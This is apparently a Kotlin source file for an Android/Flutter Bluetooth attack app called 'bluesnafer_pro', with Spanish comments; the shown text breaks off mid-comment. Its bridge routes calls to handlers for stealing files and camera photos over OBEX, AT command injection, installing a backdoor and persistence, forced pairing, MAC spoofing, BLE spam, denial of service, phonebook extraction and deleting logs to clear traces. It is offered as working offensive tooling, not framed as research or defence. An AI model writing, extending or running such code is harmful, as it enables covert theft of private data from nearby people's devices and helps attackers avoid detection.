package com.bluesnafer_pro

import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.bluetooth.BluetoothGatt
import android.bluetooth.BluetoothGattCallback
import android.bluetooth.BluetoothProfile
import android.bluetooth.BluetoothSocket
import android.bluetooth.le.ScanCallback
import android.bluetooth.le.ScanResult
import android.bluetooth.le.ScanSettings
import android.content.Context
import android.util.Log
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.UUID
import java.util.concurrent.CountDownLatch
import java.util.concurrent.ExecutorService
import java.util.concurrent.TimeUnit

/**
 * Puente unificado: conecta métodos del canal Dart `com.bluesnafer_pro/bluetooth`
 * con implementaciones reales en ExploitIntegration y módulos nativos.
 */
object BluetoothChannelBridge {
    private const val TAG = "BluetoothChannelBridge"
    private val SPP_UUID = "00001101-0000-1000-8000-00805F9B34FB"
    private val OBEX_UUID = "00001106-0000-1000-8000-00805F9B34FB"

    private val mlTrainingBuffer = mutableListOf<Map<String, Any>>()

    /** @return true si el método fue manejado */
    fun handle(
        context: Context,
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ): Boolean {
        when (call.method) {
            // ===== Exploit manager / terminal =====
            "executeVulnerability" -> handleExecuteVulnerability(call, result)
            "executeBtleJackCommand" -> handleExecuteBtleJack(call, result)
            "executeExploit" -> handleExecuteExploit(call, result)
            "executeCommand" -> handleExecuteCommand(call, result)
            "checkVulnerabilities", "checkVulnerability" -> handleCheckVulnerabilities(call, result, executor)

            // ===== Archivos =====
            "executeFileCommand" -> handleExecuteFileCommand(call, result, executor)
            "readFile" -> handleReadFile(call, result, executor)
            "previewFileContent" -> handlePreviewFileContent(call, result, executor)
            "exfiltrateFile" -> handleExfiltrateFile(call, result, executor)
            "enumerateFiles" -> handleEnumerateFiles(call, result, executor)
            "findSensitiveFiles" -> handleEnumerateFiles(call, result, executor)
            "exfiltrateMultipleFiles" -> handleExfiltrateMultiple(call, result, executor)
            "getExfiltrationStats" -> result.success(StatsManager.getExfiltrationStats())

            // ===== Persistencia =====
            "installBackdoor" -> handleInstallBackdoor(context, call, result)
            "modifyAutoPairing" -> handleModifyAutoPairing(call, result, executor)
            "injectBLEService" -> handleInjectBleService(call, result, executor)
            "createAutoConnect", "createAutoConnectProfile" -> handleCreateAutoConnect(call, result, executor)
            "modifyWhitelist", "modifyDeviceWhitelist" -> handleModifyWhitelist(call, result, executor)
            "maintainAccess" -> handleMaintainAccess(context, call, result)
            "checkPersistence" -> handleCheckPersistence(context, call, result)

            // ===== Multi-vector =====
            "attackBLE" -> handleAttackVector(call, result, "ble")
            "attackClassic" -> handleAttackVector(call, result, "classic")
            "attackOBEX" -> handleAttackVector(call, result, "obex")
            "attackFTP" -> handleAttackVector(call, result, "ftp")
            "attackAT" -> handleAttackVector(call, result, "at")
            "attackSDP" -> handleAttackVector(call, result, "sdp")
            "escalateAccess" -> handleEscalateAccess(call, result)

            // ===== Zero-day / fuzzing =====
            "fuzzSDP" -> handleFuzzSdp(call, result, executor)
            "fuzzBLE" -> handleFuzzBle(call, result, executor)
            "fuzzAT" -> handleFuzzAt(call, result, executor)
            "fuzzFileProtocols" -> handleFuzzFileProtocols(call, result, executor)
            "testBufferOverflow" -> handleTestBufferOverflow(call, result, executor)
            "exploit0Day" -> handleExploit0Day(call, result)

            // ===== Evasión =====
            "sendSDPQuery" -> handleSendSdpQuery(call, result, executor)
            "sendRFCOMMPing" -> handleSendRfcommPing(call, result, executor)
            "queryServices" -> handleSendSdpQuery(call, result, executor)
            "sendPacket" -> handleSendPacket(call, result, executor)
            "spoofMAC" -> handleSpoofMac(call, result, executor)
            "tunnelProtocol" -> handleTunnelProtocol(call, result, executor)
            "sendViaChannel" -> handleSendPacket(call, result, executor)
            "createDecoyConnection" -> handleSendRfcommPing(call, result, executor)
            "clearTraces" -> handleClearTraces(context, call, result)

            // ===== ML engine =====
            "trainMLModel" -> handleTrainMl(call, result)
            "predictStrategy" -> handlePredictStrategy(call, result)
            "partialFit" -> handlePartialFit(call, result)
            "predictSuccess" -> handlePredictSuccess(call, result)
            "getMLStats" -> handleGetMlStats(result)

            // ===== Dispositivo / conexión =====
            "connectToDevice" -> handleConnectToDevice(call, result, executor)
            "disconnectDevice", "disconnect" -> handleDisconnectDevice(call, result)
            "stopScanning" -> handleStopScan(result)
            "sendData" -> handleSendData(call, result, executor)
            "readData" -> handleReadData(call, result, executor)
            "analyzeSecurity" -> handleAnalyzeSecurity(call, result, executor)
            "enableBluetooth" -> handleEnableBluetooth(result)
            "disableBluetooth" -> handleDisableBluetooth(result)
            "getBluetoothStatus" -> handleGetBluetoothStatus(result)
            "isBluetoothEnabled" -> result.success(BluetoothAdapter.getDefaultAdapter()?.isEnabled == true)

            // ===== Delegación directa a ExploitIntegration (alias) =====
            "executeAttack", "executeATInjection", "executeDoSAttack",
            "executeSpoofingAttack", "scanDevices", "startScan",
            "getDeviceInfo", "getConfig", "setConfig", "resetConfig",
            "getStats", "clearStats", "analyzeFirmware", "exfiltrateFiles",
            "executeBlueBorne", "rotateIdentity", "startBLESpam", "stopBLESpam",
            "downloadFile", "pbapExtract", "scanOBEXServices", "sdpDiscover",
            "injectHIDScript", "bypassQuickConnect", "oppPush", "executeDoS",
            "rotateHardwareIdentity", "startLogicJammer", "stopLogicJammer",
            "bypassSpoofDevice", "bypassOBEXTrust", "mediastore_enumerate",
            "mediastore_extract", "install_persistence",
            "at_extract_identity", "sap_extract", "extract_images", "mediastore_enhanced", "gatt_image_read", "opp_server_mode", "map_image_extract" -> {
                ExploitIntegration.handleMethodCall(call, result)
            }

            else -> return false
        }
        return true
    }

    // ── Helpers ──────────────────────────────────────────────────────────────

    private fun deviceAddress(call: MethodCall): String =
        call.argument<String>("deviceAddress")
            ?: call.argument<String>("address")
            ?: ""

    private fun getDevice(call: MethodCall, result: MethodChannel.Result): BluetoothDevice? {
        val addr = deviceAddress(call)
        val adapter = BluetoothAdapter.getDefaultAdapter()
        if (adapter == null || !adapter.isEnabled) {
            result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
            return null
        }
        if (addr.isBlank()) {
            result.success(mapOf("success" to false, "error" to "No device address"))
            return null
        }
        return adapter.getRemoteDevice(addr)
    }

    private fun delegateAttack(
        deviceAddress: String,
        type: String,
        command: String = "",
        script: String = "",
        result: MethodChannel.Result
    ) {
        val call = MethodCall(
            "executeAttack",
            mapOf(
                "deviceAddress" to deviceAddress,
                "type" to type,
                "command" to command,
                "script" to script
            )
        )
        ExploitIntegration.handleMethodCall(call, result)
    }

    private fun mapVulnCommand(command: String): Pair<String, String> = when (command) {
        "vuln:obex_put" -> "obex_extract" to ""
        "vuln:ftp_anonymous" -> "file_exfil" to ""
        "vuln:ble_reconnection" -> "ble_pairing" to "justworks"
        "vuln:no_pairing_auth" -> "bypass" to "quick_connect"
        "vuln:at_command_injection" -> "at_injection" to "AT+CGMI"
        "vuln:sdp_information_leak" -> "sdp_enumerate" to ""
        "vuln:scan" -> "full_scan" to ""
        else -> "full_scan" to command
    }

    // ── Exploit commands ───────────────────────────────────────────────────

    private fun handleExecuteVulnerability(call: MethodCall, result: MethodChannel.Result) {
        val cmd = call.argument<String>("command") ?: call.argument<String>("cveId") ?: ""
        val addr = deviceAddress(call)
        if (cmd.isBlank() || addr.isBlank()) {
            result.error("INVALID_ARGS", "command and deviceAddress required", null)
            return
        }
        val (type, command) = mapVulnCommand(cmd)
        delegateAttack(addr, type, command, result = result)
    }

    private fun handleExecuteBtleJack(call: MethodCall, result: MethodChannel.Result) {
        val raw = call.argument<String>("command") ?: ""
        val addr = deviceAddress(call)
        val sub = raw.removePrefix("btlejack:")
        delegateAttack(addr, "btlejack", sub.ifEmpty { "scan" }, result = result)
    }

    private fun handleExecuteExploit(call: MethodCall, result: MethodChannel.Result) {
        val name = call.argument<String>("exploitName") ?: call.argument<String>("type") ?: ""
        val addr = deviceAddress(call)
            .ifBlank { call.argument<String>("targetAddress") ?: "" }
        if (name.isBlank() || addr.isBlank()) {
            result.error("INVALID_ARGS", "exploitName and deviceAddress required", null)
            return
        }
        delegateAttack(addr, name, result = result)
    }

    private fun handleExecuteCommand(call: MethodCall, result: MethodChannel.Result) {
        val command = call.argument<String>("command") ?: ""
        val addr = deviceAddress(call)
        if (command.isBlank()) {
            result.error("INVALID_ARGS", "command required", null)
            return
        }
        when {
            command.startsWith("btlejack:") -> handleExecuteBtleJack(
                MethodCall("executeBtleJackCommand", mapOf("command" to command, "deviceAddress" to addr)),
                result
            )
            command.startsWith("vuln:") -> handleExecuteVulnerability(
                MethodCall("executeVulnerability", mapOf("command" to command, "deviceAddress" to addr)),
                result
            )
            command.startsWith("sdp:") -> delegateAttack(addr, "sdp_enumerate", result = result)
            command == "info" -> {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                val available = adapter != null
                result.success(mapOf(
                    "success" to available,
                    "message" to if (available) "Device info" else "Bluetooth adapter no disponible",
                    "name" to (adapter?.name ?: "Unknown"),
                    "address" to (adapter?.address ?: ""),
                    "enabled" to (adapter?.isEnabled == true)
                ))
            }
            command.startsWith("file:enum") || command.startsWith("file:browse") -> {
                ExploitIntegration.handleMethodCall(
                    MethodCall("executeAttack", mapOf("deviceAddress" to addr, "type" to "file_exfil_dir", "command" to "/")),
                    result
                )
            }
            command.startsWith("file:exfiltrate") -> {
                ExploitIntegration.handleMethodCall(
                    MethodCall("downloadFile", mapOf("deviceAddress" to addr, "remotePath" to "/DCIM/Camera")),
                    result
                )
            }
            command.startsWith("ble:") -> delegateAttack(addr, "gatt_bulk_read", result = result)
            else -> result.success(mapOf("success" to false, "error" to "Unknown command: $command"))
        }
    }

    private fun handleCheckVulnerabilities(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                val scan = OBEXVulnerabilityAnalyzer.scanOBEXVulnerabilities(device)
                val sdp = MissingClasses.SDPServiceDiscovery.discoverServices(device)
                val obexVuln = scan["anyVulnerable"] as? Boolean == true
                val sdpOk = sdp["success"] as? Boolean == true
                result.success(mapOf(
                    "vulnerable" to (obexVuln || sdpOk),
                    "obex" to scan,
                    "sdp" to sdp,
                    "checks" to (call.argument<List<String>>("checks") ?: emptyList<String>())
                ))
            } catch (e: Exception) {
                result.success(mapOf("vulnerable" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    // ── Archivos ─────────────────────────────────────────────────────────────

    private fun handleExecuteFileCommand(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val path = call.argument<String>("path") ?: "/"
        executor.submit {
            try {
                val obexResult = RealFileExfiltrationClient.attemptFileConnection(device) { Log.d(TAG, it) }
                val files = (obexResult["files"] as? List<*>)?.mapNotNull { f ->
                    if (f is Map<*, *>) {
                        mapOf(
                            "name" to (f["name"] ?: f["file"] ?: "unknown"),
                            "path" to (f["path"] ?: path),
                            "size" to (f["size"] ?: 0),
                            "type" to "file"
                        )
                    } else null
                } ?: emptyList()
                val json = JSONObject().apply {
                    put("success", obexResult["success"] == true)
                    put("files", JSONArray(files))
                    put("path", path)
                }
                result.success(json.toString())
            } catch (e: Exception) {
                result.success("""{"success":false,"error":"${e.message}","files":[]}""")
            }
        }
    }

    private fun handleReadFile(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val filePath = call.argument<String>("filePath") ?: ""
        executor.submit {
            try {
                ExploitIntegration.handleMethodCall(
                    MethodCall("downloadFile", mapOf("deviceAddress" to device.address, "remotePath" to filePath)),
                    object : MethodChannel.Result {
                        override fun success(r: Any?) {
                            if (r is Map<*, *>) {
                                val data = r["data"]
                                if (data is ByteArray) result.success(data)
                                else result.success(r)
                            } else result.success(r)
                        }
                        override fun error(c: String, m: String?, d: Any?) { result.success(mapOf("error" to m)) }
                        override fun notImplemented() { result.success(mapOf("error" to "not implemented")) }
                    }
                )
            } catch (e: Exception) {
                result.success(mapOf("error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handlePreviewFileContent(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val filePath = call.argument<String>("filePath") ?: call.argument<String>("path") ?: ""
        executor.submit {
            try {
                ExploitIntegration.handleMethodCall(
                    MethodCall("downloadFile", mapOf("deviceAddress" to device.address, "remotePath" to filePath)),
                    object : MethodChannel.Result {
                        override fun success(r: Any?) {
                            result.success(mapOf("success" to true, "preview" to r.toString().take(500), "path" to filePath))
                        }
                        override fun error(c: String, m: String?, d: Any?) {
                            result.success(mapOf("success" to false, "error" to m))
                        }
                        override fun notImplemented() {
                            result.success(mapOf("success" to false, "error" to "not implemented"))
                        }
                    }
                )
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleExfiltrateFile(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val filePath = call.argument<String>("filePath") ?: call.argument<String>("path") ?: ""
        executor.submit {
            try {
                ExploitIntegration.handleMethodCall(
                    MethodCall("downloadFile", mapOf("deviceAddress" to device.address, "remotePath" to filePath)),
                    result
                )
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleEnumerateFiles(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                val obexResult = RealFileExfiltrationClient.attemptFileConnection(device) { Log.d(TAG, it) }
                result.success(obexResult)
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "files" to emptyList<Any>(), "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleExfiltrateMultiple(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val paths = call.argument<List<String>>("filePaths")
            ?: call.argument<Map<String, String>>("files")?.keys?.toList()
            ?: emptyList()
        executor.submit {
            val results = mutableListOf<Map<String, Any>>()
            for (path in paths) {
                val latch = CountDownLatch(1)
                var fileResult: Any? = null
                ExploitIntegration.handleMethodCall(
                    MethodCall("downloadFile", mapOf("deviceAddress" to device.address, "remotePath" to path)),
                    object : MethodChannel.Result {
                        override fun success(r: Any?) { fileResult = r; latch.countDown() }
                        override fun error(c: String, m: String?, d: Any?) {
                            fileResult = mapOf("success" to false, "error" to m); latch.countDown()
                        }
                        override fun notImplemented() { latch.countDown() }
                    }
                )
                latch.await(30, TimeUnit.SECONDS)
                if (fileResult is Map<*, *>) results.add(fileResult as Map<String, Any>)
            }
            result.success(mapOf("success" to results.isNotEmpty(), "results" to results, "count" to results.size))
        }
    }

    // ── Persistencia ─────────────────────────────────────────────────────────

    private fun handleInstallBackdoor(context: Context, call: MethodCall, result: MethodChannel.Result) {
        ExploitIntegration.handleMethodCall(
            MethodCall("install_persistence", mapOf("deviceAddress" to deviceAddress(call))),
            result
        )
    }

    private fun handleModifyAutoPairing(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                device.createBond()
                Thread.sleep(2000)
                val bonded = device.bondState == BluetoothDevice.BOND_BONDED
                result.success(bonded)
            } catch (e: Exception) {
                result.success(false)
            }
        }
    }

    private fun handleInjectBleService(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                BLESpammer.startSpam(device)
                result.success(true)
            } catch (e: Exception) {
                result.success(false)
            }
        }
    }

    private fun handleCreateAutoConnect(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                device.setPairingConfirmation(true)
                device.createBond()
                Thread.sleep(2000)
                result.success(device.bondState == BluetoothDevice.BOND_BONDED)
            } catch (e: Exception) {
                result.success(false)
            }
        }
    }

    private fun handleModifyWhitelist(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        handleCreateAutoConnect(call, result, executor)
    }

    private fun handleMaintainAccess(context: Context, call: MethodCall, result: MethodChannel.Result) {
        val addr = deviceAddress(call)
        if (addr.isNotBlank()) PersistenceService.startService(context, addr)
        result.success(null)
    }

    private fun handleCheckPersistence(context: Context, call: MethodCall, result: MethodChannel.Result) {
        val prefs = context.getSharedPreferences("bluesnafer_prefs", Context.MODE_PRIVATE)
        val enabled = prefs.getBoolean("persistence_enabled", false)
        val target = prefs.getString("target_device_address", "") ?: ""
        val addr = deviceAddress(call)
        result.success(enabled && (addr.isBlank() || target == addr))
    }

    // ── Multi-vector ─────────────────────────────────────────────────────────

    private fun handleAttackVector(
        call: MethodCall,
        result: MethodChannel.Result,
        vector: String
    ) {
        val addr = deviceAddress(call)
        if (addr.isBlank()) {
            result.success(mapOf("success" to false, "error" to "No device address"))
            return
        }
        val (type, command) = when (vector) {
            "ble" -> "btlejack" to "scan"
            "classic" -> "rfcomm_exploit" to ""
            "obex" -> "obex_scan" to ""
            "ftp" -> "file_exfil" to ""
            "at" -> "at_injection" to "AT"
            "sdp" -> "sdp_enumerate" to ""
            else -> "full_scan" to ""
        }
        delegateAttack(addr, type, command, result = object : MethodChannel.Result {
            override fun success(r: Any?) {
                val success = (r as? Map<*, *>)?.get("success") == true
                result.success(mapOf("success" to success, "data" to r, "vector" to vector))
            }
            override fun error(c: String, m: String?, d: Any?) {
                result.success(mapOf("success" to false, "error" to m, "vector" to vector))
            }
            override fun notImplemented() {
                result.success(mapOf("success" to false, "vector" to vector))
            }
        })
    }

    private fun handleEscalateAccess(call: MethodCall, result: MethodChannel.Result) {
        val addr = deviceAddress(call)
        val vector = call.argument<String>("initialVector") ?: "unknown"
        delegateAttack(addr, "multi_extract", result = object : MethodChannel.Result {
            override fun success(r: Any?) {
                val ok = (r as? Map<*, *>)?.get("success") == true
                result.success(mapOf(
                    "success" to ok,
                    "accessLevel" to if (ok) "read" else "none",
                    "capabilities" to if (ok) listOf("obex", "pbap", "gatt") else emptyList<String>()
                ))
            }
            override fun error(c: String, m: String?, d: Any?) {
                result.success(mapOf("success" to false, "accessLevel" to "none", "capabilities" to emptyList<String>()))
            }
            override fun notImplemented() {
                result.success(mapOf("success" to false, "accessLevel" to "none"))
            }
        })
    }

    // ── Fuzzing / zero-day ───────────────────────────────────────────────────

    private fun handleFuzzSdp(call: MethodCall, result: MethodChannel.Result, executor: ExecutorService) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            val sdp = MissingClasses.SDPServiceDiscovery.discoverServices(device)
            val vulns = if (sdp["success"] == true) listOf(mapOf(
                "type" to "sdp_info_leak", "location" to "SDP",
                "payload" to "service_discovery", "severity" to 0.6, "exploitable" to true
            )) else emptyList()
            result.success(vulns)
        }
    }

    private fun handleFuzzBle(call: MethodCall, result: MethodChannel.Result, executor: ExecutorService) {
        val device = getDevice(call, result) ?: return
        val ctx = BluetoothMethodHandler.getAppContext() ?: return result.success(emptyList<Any>())
        executor.submit {
            val chars = mutableListOf<Map<String, Any>>()
            val latch = CountDownLatch(1)
            val gatt = device.connectGatt(ctx, false, object : BluetoothGattCallback() {
                override fun onServicesDiscovered(g: BluetoothGatt?, status: Int) {
                    g?.services?.forEach { svc ->
                        svc.characteristics.forEach { c ->
                            chars.add(mapOf("uuid" to c.uuid.toString(), "props" to c.properties))
                        }
                    }
                    latch.countDown()
                }
                override fun onConnectionStateChange(g: BluetoothGatt?, s: Int, state: Int) {
                    if (state == BluetoothProfile.STATE_CONNECTED) g?.discoverServices()
                    else if (state == BluetoothProfile.STATE_DISCONNECTED) latch.countDown()
                }
            })
            latch.await(10, TimeUnit.SECONDS)
            try { gatt?.close() } catch (_: Exception) {}
            val vulns = chars.take(5).map { c ->
                mapOf("type" to "ble_char", "location" to c["uuid"], "payload" to "read",
                    "severity" to 0.5, "exploitable" to true)
            }
            result.success(vulns)
        }
    }

    private fun handleFuzzAt(call: MethodCall, result: MethodChannel.Result, executor: ExecutorService) {
        val device = getDevice(call, result) ?: return
        val commands = call.argument<List<String>>("commands") ?: listOf("AT", "AT+CGMI")
        executor.submit {
            val vulns = mutableListOf<Map<String, Any>>()
            for (cmd in commands.take(10)) {
                val r = RealATInjection.inject(device, cmd) { Log.d(TAG, it) }
                if (r["success"] == true) {
                    vulns.add(mapOf("type" to "at_response", "location" to "RFCOMM",
                        "payload" to cmd, "severity" to 0.7, "exploitable" to true))
                }
            }
            result.success(vulns)
        }
    }

    private fun handleFuzzFileProtocols(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            val obex = OBEXVulnerabilityAnalyzer.scanOBEXVulnerabilities(device)
            val vulns = mutableListOf<Map<String, Any>>()
            if (obex["anyVulnerable"] == true) {
                vulns.add(mapOf("type" to "obex_unauth", "location" to "OBEX_FTP",
                    "payload" to "connect", "severity" to 0.8, "exploitable" to true))
            }
            result.success(vulns)
        }
    }

    private fun handleTestBufferOverflow(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            val vulns = mutableListOf<Map<String, Any>>()
            try {
                val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket.connect()
                val big = ByteArray(2048) { 0x41 }
                socket.outputStream.write(big)
                socket.close()
                vulns.add(mapOf("type" to "buffer_test", "location" to "RFCOMM",
                    "payload" to "2048_bytes", "severity" to 0.4, "exploitable" to false))
            } catch (e: Exception) {
                vulns.add(mapOf("type" to "buffer_rejected", "location" to "RFCOMM",
                    "payload" to (e.message ?: ""), "severity" to 0.2, "exploitable" to false))
            }
            result.success(vulns)
        }
    }

    private fun handleExploit0Day(call: MethodCall, result: MethodChannel.Result) {
        val addr = deviceAddress(call)
        val vuln = call.argument<Map<String, Any>>("vulnerability")
        val type = vuln?.get("type")?.toString() ?: "unknown"
        val (attackType, cmd) = when {
            type.contains("obex") -> "obex_extract" to ""
            type.contains("ble") -> "gatt_bulk_read" to ""
            type.contains("at") -> "at_injection" to "AT"
            else -> "full_scan" to ""
        }
        delegateAttack(addr, attackType, cmd, result = object : MethodChannel.Result {
            override fun success(r: Any?) {
                result.success((r as? Map<*, *>)?.get("success") == true)
            }
            override fun error(c: String, m: String?, d: Any?) { result.success(false) }
            override fun notImplemented() { result.success(false) }
        })
    }

    // ── Evasión ──────────────────────────────────────────────────────────────

    private fun handleSendSdpQuery(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            val sdp = MissingClasses.SDPServiceDiscovery.discoverServices(device)
            result.success(sdp)
        }
    }

    private fun handleSendRfcommPing(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            try {
                val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket.connect()
                socket.outputStream.write(byteArrayOf(0x00))
                socket.close()
                result.success(mapOf("success" to true))
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleSendPacket(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        val data = call.argument<ByteArray>("data")
            ?: call.argument<List<Int>>("data")?.map { it.toByte() }?.toByteArray()
            ?: byteArrayOf(0x00)
        executor.submit {
            try {
                val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket.connect()
                socket.outputStream.write(data)
                socket.close()
                result.success(mapOf("success" to true, "bytes" to data.size))
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }
    }

    private fun handleSpoofMac(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val device = getDevice(call, result) ?: return
        executor.submit {
            val r = BluetoothBypassEngine.executeBypass(device, "mac_spoof")
            result.success(r["success"] == true)
        }
    }

    private fun handleTunnelProtocol(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        handleSendPacket(
            MethodCall("sendPacket", mapOf(
                "deviceAddress" to deviceAddress(call),
                "data" to (call.argument<List<Int>>("payload") ?: emptyList<Int>())
            )),
            result, executor
        )
    }

    private fun handleClearTraces(context: Context, call: MethodCall, result: MethodChannel.Result) {
        try {
            val logDir = File(context.filesDir, "logs")
            val files = logDir.listFiles() ?: emptyArray()
            var deleted = 0
            files.forEach { if (it.delete()) deleted++ }
            result.success(mapOf(
                "success" to (deleted > 0 || files.isEmpty()),
                "deleted" to deleted,
                "remaining" to (logDir.listFiles()?.size ?: 0)
            ))
        } catch (e: Exception) {
            result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
        }
    }

    // ── ML (heurístico en dispositivo) ───────────────────────────────────────

    private fun handleTrainMl(call: MethodCall, result: MethodChannel.Result) {
        val data = call.argument<List<Map<String, Any>>>("trainingData") ?: emptyList()
        mlTrainingBuffer.addAll(data)
        if (mlTrainingBuffer.size > 1000) {
            mlTrainingBuffer.subList(0, mlTrainingBuffer.size - 1000).clear()
        }
        result.success(mapOf(
            "success" to data.isNotEmpty(),
            "samples" to mlTrainingBuffer.size,
            "added" to data.size
        ))
    }

    private fun handlePredictStrategy(call: MethodCall, result: MethodChannel.Result) {
        val profile = call.argument<Map<String, Any>>("deviceProfile") ?: emptyMap()
        val hasBle = profile["bleActive"] == true || profile["hasGatt"] == true
        val hasObex = profile["supportsOBEX"] == true || profile["obexEnabled"] == true
        val exploits = mutableListOf<String>()
        if (hasObex) exploits.add("vuln:obex_put")
        if (hasBle) exploits.add("btlejack:scan")
        exploits.add("vuln:sdp_information_leak")
        result.success(mapOf(
            "recommendedExploits" to exploits,
            "optimalOrder" to exploits.indices.toList(),
            "optimalTiming" to exploits.associateWith { 2000 },
            "expectedSuccess" to if (exploits.size > 1) 0.65 else 0.45,
            "estimatedDuration" to 30
        ))
    }

    private fun handlePartialFit(call: MethodCall, result: MethodChannel.Result) {
        val sample = call.argument<Map<String, Any>>("sample")
        val added = if (sample != null) {
            mlTrainingBuffer.add(sample)
            true
        } else {
            false
        }
        result.success(mapOf("success" to added, "samples" to mlTrainingBuffer.size))
    }

    private fun handlePredictSuccess(call: MethodCall, result: MethodChannel.Result) {
        val exploit = call.argument<String>("exploit") ?: ""
        val profile = call.argument<Map<String, Any>>("deviceProfile") ?: emptyMap()
        var score = 0.5
        if (exploit.contains("obex") && profile["supportsOBEX"] == true) score += 0.2
        if (exploit.contains("ble") && profile["bleActive"] == true) score += 0.15
        val historical = mlTrainingBuffer.count { it["success"] == true }.toDouble() /
            mlTrainingBuffer.size.coerceAtLeast(1)
        score = (score + historical * 0.1).coerceIn(0.1, 0.95)
        result.success(score)
    }

    private fun handleGetMlStats(result: MethodChannel.Result) {
        result.success(mapOf(
            "samples" to mlTrainingBuffer.size,
            "successRate" to mlTrainingBuffer.count { it["success"] == true }.toDouble() /
                mlTrainingBuffer.size.coerceAtLeast(1),
            "modelType" to "on_device_heuristic"
        ))
    }

    // ── Dispositivo ────────────────────────────────────────────────────────────

    private fun handleConnectToDevice(
        call: MethodCall,
        result: MethodChannel.Result,
        executor: ExecutorService
    ) {
        val addr = call.argument<String>("address")
            ?: (call.arguments as? Map<*, *>)?.get("address")?.toString()
            ?: deviceAddress(call)
        if (addr.isBlank()) {
            result.success(false)
            return
        }
        executor.submit {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter() ?: return@submit result.success(false)
                val device = adapter.getRemoteDevice(addr)
                val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                socket.connect()
                socket.close()
                result.success(true)
            } catch (e: Exception) {
                try {
                    val adapter = BluetoothAdapter.getDefaultAdapter() ?: return@submit result.success(false)
                    val device = adapter.getRemoteDevice(addr)
                    device.createBond()
                    Thread.sleep(2000)
                    result.success(device.bondState == BluetoothDevice.BOND_BONDED)
                } catch (_: Exception) {
                    result.success(false)
                }
            }
        }
    }

    private fun handleDisconnectDevice(
        call: MethodCall,
        result: MethodChannel.Result
    ) {
        val addr = deviceAddress(call)
        if (addr.isBlank()) {
            result.success(mapOf("success" to false, "error" to "No device address"))
            return
        }
        Thread {
            try {
                val adapter = BluetoothAdapter.getDefaultAdapter()
                if (adapter == null || !adapter.isEnabled) {
                    result.success(mapOf("success" to false, "error" to "Bluetooth not available"))
                    return@Thread
                }
                val device = adapter.getRemoteDevice(addr)
                val closed = try {
                    val socket = device.createInsecureRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID))
                    socket.connect()
                    socket.close()
                    true
                } catch (e: Exception) {
                    // Si no hay conexión activa, cerrar sockets propios basta
                    true
                }
                // Desvincular dispositivo (API oculta) si está vinculado
                var unbonded = false
                try {
                    if (device.bondState == BluetoothDevice.BOND_BONDED) {
                        val removeBond = device.javaClass.getMethod("removeBond")
                        removeBond.isAccessible = true
                        unbonded = removeBond.invoke(device) as Boolean
                    }
                } catch (_: Exception) {
                    unbonded = false
                }
                result.success(
                    mapOf(
                        "success" to true,
                        "closedSockets" to closed,
                        "unbonded" to unbonded
                    )
                )
            } catch (e: Exception) {
                result.success(mapOf("success" to false, "error" to (e.message ?: "Unknown")))
            }
        }.start()
    }

    /**
     * Detiene el escaneo clásico en curso (real) vía cancelDiscovery().
